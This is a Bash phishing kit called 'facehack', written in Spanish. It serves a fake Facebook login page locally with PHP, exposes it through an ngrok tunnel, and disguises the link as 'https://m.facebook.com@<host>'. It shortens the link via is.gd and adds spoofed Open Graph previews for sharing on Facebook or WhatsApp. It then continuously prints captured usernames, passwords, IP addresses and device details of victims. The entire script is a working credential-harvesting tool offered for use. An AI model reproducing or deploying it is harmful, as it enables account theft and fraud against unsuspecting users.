#!/usr/bin/bash

#colores

declare -gA colours=(
	["gray"]="\033[1;30m" ["red"]="\033[1;31m"
	["green"]="\033[1;32m" ["yellow"]="\033[1;33m"
	["blue"]="\033[1;34m" ["cyan"]="\033[1;35m"
	["white"]="\033[0m"
)
trap ctrl_c INT > /dev/null 2>&1


function ctrl_c {
	pkill php 2> /dev/null; pkill ngrok 2> /dev/null
	for ((x=1; x<=2; x=x+1)); do
		if [[ ${x} -eq 1 ]]; then echo ''; fi
		echo -ne "${colours["yellow"]}[${colours["red"]}-${colours["yellow"]}] ${colours["red"]}Saliendo.${colours["white"]}\r"; sleep 0.5
		echo -ne "${colours["yellow"]}[${colours["red"]}+${colours["yellow"]}] ${colours["red"]}Saliendo..${colours["white"]}\r"; sleep 0.5
		echo -ne "${colours["yellow"]}[${colours["red"]}-${colours["yellow"]}] ${colours["red"]}Saliendo...${colours["white"]}\r"; sleep 0.5
		if [[ ${x} -eq 2 ]]; then echo ''; fi
	done
	tput cnorm; exit 0
}

function dependencias(){
	pkill php 2> /dev/null; pkill ngrok 2> /dev/null
command -v ruby > /dev/null 2>&1 || {
	echo >&2 -Ee "\n${colours["yellow"]}[${colours["red"]}+${colours["yellow"]}] ${colours["red"]}No tienes instalado ruby, instalalo!.\n"
	echo >&2 -Ee "\t${colours["green"]}apt install ruby -y${colours["white"]}\n"; exit 1
}

command -v tput > /dev/null 2>&1 || {
        echo >&2 -Ee "\n${colours["yellow"]}[${colours["red"]}+${colours["yellow"]}] ${colours["red"]}No tienes instalado ncurses, instalalo!.\n"
        echo >&2 -Ee "\t${colours["green"]}apt install ncurses-utils -y${colours["white"]}\n"; exit 1
}

command -v php > /dev/null 2>&1 || {
	echo >&2 -Ee "\n${colours["yellow"]}[${colours["red"]}+${colours["yellow"]}] ${colours["red"]}No tienes instalado php, instalalo!.\n"
	echo >&2 -Ee "\t${colours["green"]}apt install php -y${colours["white"]}\n"; exit 1
}

command -v wget > /dev/null 2>&1 || {
	echo >&2 -Ee "\n${colours["yellow"]}[${colours["red"]}+${colours["yellow"]}] ${colours["red"]}No tienes instalado wget, instalalo!.\n"
	echo >&2 -Ee "\t${colours["green"]}apt install wget -y${colours["white"]}\n"; exit 1
}

command -v curl > /dev/null 2>&1 || {
        echo >&2 -Ee "\n${colours["yellow"]}[${colours["red"]}+${colours["yellow"]}] ${colours["red"]}No tienes instalado curl, instalalo!.\n"
        echo >&2 -Ee "\t${colours["green"]}apt install curl -y${colours["white"]}\n"; exit 1
}

command -v lolcat > /dev/null 2>&1 || {
	echo >&2 -Ee "\n${colours["yellow"]}[${colours["red"]}+${colours["yellow"]}] ${colours["red"]}No tienes instalado lolcat, instalalo!.\n"
        echo >&2 -Ee "\t${colours["green"]}gem install lolcat${colours["white"]}\n"; exit 1
}

}

function banner(){
tput civis; clear; cd files
cat fn.html > index.html
echo -e "${blue}
  _____   ____     __    ___  __ __   ____     __  __  _
 |     | /    T   /  ]  /  _]|  T  T /    T   /  ]|  l/ ]
 |   __jY  o  |  /  /  /  [_ |  l  |Y  o  |  /  / |  ' /
 |  l_  |     | /  /  Y    _]|  _  ||     | /  /  |    \

 |   _] |  _  |/   \_ |   [_ |  |  ||  _  |/   \_ |     Y
 |  T   |  |  |\     ||     T|  |  ||  |  |\     ||  .  |
 l__j   l__j__j \____jl_____jl__j__jl__j__j \____jl__j\_j" | lolcat; tput civis
  echo -Ee "      github: https://github.com/wilian-lgn/facehack" | lolcat -a; tput civis
  echo -Ee "\t    facebook: https://fb.me/wilian.lgn" | lolcat -a; tput civis
  opciones2
}

function agregado(){
	for ((x=1; x<=40; x++)); do echo -Een "-"; done
	echo -Ee "

  [++] Título => ${url3}
  [++] Descripcion => ${url1}
  [++] Imagen => ${url2}
  [++] URL personalizada => ${url4}
  [++] Subdominio => ${url5}
  "
	for ((x=1; x<=40; x++)); do echo -Een "-"; done
}

function opciones2(){
  tput cnorm; echo -Ee "

  [01] Agregar descripcion
  [02] Agregar imagen
  [03] Agregar título

  [04] Agregar URL personalizado (con acortador)
  [05] Agregar subdominio personalizado (ngrok => VIP)
  [06] Agregar Imagen de fondo ala pagina
  [07] Agregar degradado a la pagina
  [08] Agregar descripcion a la pagina

  [20] Empezar\n"
read -p $'\033[1;32mOPCION: \033[1;34m' opcion

if [ -z ${opcion} ]; then
	echo -Ee "no escribite nada"
elif [[ ${opcion} == "1" || ${opcion} == "01" ]]; then
	description
elif [[ ${opcion} == "2" || ${opcion} == "02" ]]; then
	imagen
elif [[ ${opcion} == "3" || ${opcion} == "03" ]]; then
	titulo
elif [[ ${opcion} == "4" || ${opcion} == "04" ]]; then
	urlAcortador
elif [[ ${opcion} == "20" ]]; then
	empezar
fi

}

function empezar(){
	clear; echo ''; cat .phoenix | lolcat; ngrok
}

function urlAcortador(){
	clear
        echo -Ee "\n${colours["yellow"]}AGREGE UN NOMBRE ALA URL, ESTO SE VERA AL LADO DE LA URL 
	ACORTADA${colours["white"]}\n"
	echo -e "  \033[4;35mEjemplo:\033[0m\n"
	echo -e "${colours["gray"]}\thttps://is.gd/ ${colours["blue"]}darkside\n"
        read -p $'\033[1;32m URL personalizada: \033[0m' url4
        if [[ -z ${url4} ]]; then
        echo -e "${colours["red"]}NO ESCRIBISTE NADA!"; sleep 1.5
        clear; titulo
	else
		touch url.txt; echo -Ee "${url4}" > url.txt
		clear; agregado; opciones2
	fi
}

function imagen(){
	clear
        echo -Ee "\n${colours["yellow"]}ESTA IMAGEN SE MOSTRARA CUANDO COMPARTAS LA URL EN FACEBOOK O WHATSAPP${colours["white"]}\n"
        read -p $'\033[1;32m imagen: \033[0m' url2
	if [[ -z ${url2} ]]; then
        echo -e "${colours["red"]}NO ESCRIBISTE NADA!"; sleep 1.5
        clear; titulo
else
        echo -e "<html><head><meta property='og:image' content='${url2}'></head></html>" >> index.html
        clear; agregado; opciones2
        fi
}

function titulo(){
	clear
	echo -Ee "\n${colours["yellow"]}ESTO SE MOSTRARA CUANDO COMPARTAS LA URL EN FACEBOOK O WHATSAPP${colours["white"]}\n"
	read -p $'\033[1;32m Título: \033[0m' url3
	if [[ -z ${url3} ]]; then
	echo -e "${colours["red"]}NO ESCRIBISTE NADA!"; sleep 1.5
	clear; titulo
else
	echo -e "<html><head><meta property='og:title' content='${url3}'></head></html>" >> index.html
	clear; agregado; opciones2
	fi
}

function description(){
	clear
	echo -Ee "\n${colours["yellow"]}ESTO SE MOSTRARA CUANDO COMPARTAS LA URL EN FACEBOOK O WHATSAPP${colours["white"]}\n"
read -p $'\033[1;32m Descripcion: \033[0m' url1
 if [[ -z ${url1} ]]; then
	 echo -e "${colours["red"]}NO ESCRIBISTE NADA!"; sleep 1.5
	 clear; description
 else
	 echo -e "<html><head><meta property='og:description' content='${url1}'></head/html>" >> index.html
	 clear; agregado; opciones2
 fi
}

function ngrok(){
	 tput civis; php -S localhost:4433 2> /dev/null > /dev/null &
	 for ((x=1;x<=6; x=x+1)); do
		 echo -ne "\r${colours["yellow"]}[${colours["red"]}+${colours["yellow"]}] ${colours["yellow"]}Abriendo servidor local."; sleep 0.2
		 echo -ne "\r${colours["yellow"]}[${colours["red"]}|${colours["yellow"]}] ${colours["yellow"]}Abriendo servidor local.."; sleep 0.2
		 echo -ne "\r${colours["yellow"]}[${colours["red"]}+${colours["yellow"]}] ${colours["yellow"]}Abriendo servidor local..."; sleep 0.2
		 if [[ ${x} -eq 6 ]]; then echo ''; fi
	 done

	 ./ngrok http 4433 > /dev/null 2> /dev/null &

	 for ((x=1;x<=17; x=x+1)); do
		 echo -ne "\r${colours["yellow"]}[${colours["red"]}+${colours["yellow"]}] ${colours["yellow"]}Abriendo servidor ngrok."; sleep 0.2
                 echo -ne "\r${colours["yellow"]}[${colours["red"]}|${colours["yellow"]}] ${colours["yellow"]}Abriendo servidor ngrok.."; sleep 0.2
                 echo -ne "\r${colours["yellow"]}[${colours["red"]}+${colours["yellow"]}] ${colours["yellow"]}Abriendo servidor ngrok..."; sleep 0.2
		 if [[ ${x} -eq 17 ]]; then echo ""; fi
	 done
echo -Ee "${colours["yellow"]}[${colours["red"]}+${colours["yellow"]}] ${colours["yellow"]}Obteniendo links..."; sleep 1.5
echo -Ee "${colours["yellow"]}[${colours["red"]}+${colours["yellow"]}] ${colours["yellow"]}Servidor local:${colours["white"]} localhost:4433"

echo -Ee "${colours["yellow"]}[${colours["red"]}+${colours["yellow"]}] ${colours["yellow"]}Servidor ngrok:${colours["white"]} $(curl -s http://127.0.0.1:404[0-9]/api/tunnels | grep -o "https://[a-z0-9A-Z]*\.ngrok.io" | head -n1)"

echo -Ee "${colours["yellow"]}[${colours["red"]}+${colours["yellow"]}] ${colours["yellow"]}Servidor local.run:${colours["red"]} Deshabilitado!"

echo -Ee "${colours["yellow"]}[${colours["red"]}+${colours["yellow"]}] ${colours["yellow"]}Servidor serveo.net:${colours["red"]} Deshabilitado!"

echo -Ee "${colours["yellow"]}[${colours["red"]}+${colours["yellow"]}] ${colours["yellow"]}URL camuflado:${colours["white"]} https://m.facebook.com@$(curl -s http://127.0.0.1:404[0-9]/api/tunnels | grep -o "https://[a-z0-9A-Z]*\.ngrok.io" | head -n1 | cut -c 9-100)"

echo -Ee "${colours["yellow"]}[${colours["red"]}+${colours["yellow"]}] ${colours["yellow"]}URL acortado: ${colours["white"]}$(curl -s -X POST https://is.gd/create.php -F "url=$(curl -s http://127.0.0.1:404[0-9]/api/tunnels | grep -o "https://[a-z0-9A-Z]*\.ngrok.io" | head -n1)" | grep -ioE "https://is.gd/[0-9a-zA-Z]*" | head -n1)"

echo -Ee "${colours["yellow"]}[${colours["red"]}+${colours["yellow"]}] ${colours["yellow"]}URL personalizado: ${colours["white"]}$(curl -s -X POST https://is.gd/create.php -d "url=$(curl -s http://127.0.0.1:404[0-9]/api/tunnels | grep -o "https://[a-z0-9A-Z]*\.ngrok.io" | head -n1)&shorturl=${url4}" | grep -ioE "https://is.gd/[0-9a-zA-Z]*" | head -n1)"

echo -Ee "\n${colours["yellow"]}[${colours["red"]}+${colours["yellow"]}] ${colours["gray"]}Esperando datos...\t\t\t${colours["green"]}    parar: ctrl+c"

while [ true ]; do
	if [ -f credentials.txt ]; then
		echo -e "\n\n${colours["yellow"]}[${colours["red"]}+${colours["yellow"]}] ${colours["yellow"]}Usuario: ${white}$(grep -i "usuario" credentials.txt | cut -d ":" -f2)"
		echo -e "${colours["yellow"]}[${colours["red"]}+${colours["yellow"]}] ${colours["${colours["yellow"]}"]}Contraseña: ${white}$(grep -i "Contrasena" credentials.txt| cut -d ":" -f2)\n"
		for ((x=1; x<=50; x=x+1)); do echo -nEe "${colours["blue"]}#"; done
		rm -f credentials.txt
	fi
	if [ -f credentials2.txt ]; then
		echo '';for ((x=1; x<=50; x=x+1)); do echo -nEe "${colours["blue"]}#"; done
		echo -e "\n\n${colours["yellow"]}[${colours["red"]}+${colours["yellow"]}] \033[0;33mLa victima accedió al link!"
		if [ -f ip.txt ]; then echo -Ee "\n${colours["yellow"]}[${colours["red"]}+${colours["yellow"]}] ${yellow}IP:${colours["white"]}$(cat ip.txt | grep -iE "ip" | cut -d ':' -f2)"; fi
		echo -e "${colours["yellow"]}[${colours["red"]}+${colours["yellow"]}] ${colours["yellow"]}Mobile:${colours["white"]}$(grep -i "user-agent" credentials2.txt | cut -d ":" -f2 | cut -d ")" -f1 | cut -d ";" -f3)"
		echo -e "${colours["yellow"]}[${colours["red"]}+${colours["yellow"]}] ${colours["yellow"]}Version:${colours["white"]}$(grep -i "user-agent" credentials2.txt | cut -d ":" -f2 | cut -d ";" -f2 )"
		echo -e "${colours["yellow"]}[${colours["red"]}+${colours["yellow"]}] ${colours["yellow"]}Navegador: ${colours["white"]}$(grep -i "user-agent" credentials2.txt | cut -d ":" -f2 | cut -d ")" -f3 | cut -d " " -f2 | tr -d ' ')"
		echo -e "${colours["yellow"]}[${colours["red"]}+${colours["yellow"]}] ${colours["yellow"]}Sistema Operativo:${colours["white"]}$(grep -i "sistema" credentials2.txt | cut -d ":" -f2)"
		if [ $(grep -i "lenguaje" credentials2.txt| cut -d ":" -f2 | tr -d ' ') == "es-PE" ]; then
			echo -Ee "${colours["yellow"]}[${colours["red"]}+${colours["yellow"]}] ${colours["yellow"]}lenguaje: ${colours["white"]}Español/Castellano"
			echo -Ee "${colours["yellow"]}[${colours["red"]}+${colours["yellow"]}] ${colours["yellow"]}País: ${colours["white"]}Perú\n"
		else
			echo -e "${colours["yellow"]}[${colours["red"]}+${colours["yellow"]}] ${colours["yellow"]}lenguaje:${colours["white"]}$(grep -i "lenguaje" credentials2.txt| cut -d ":" -f2)\n"
		fi
		for ((x=1; x<=50; x=x+1)); do echo -nEe "${colours["blue"]}#"; done
		rm -rf credentials2.txt
	fi
done
}

dependencias
banner
ngrok
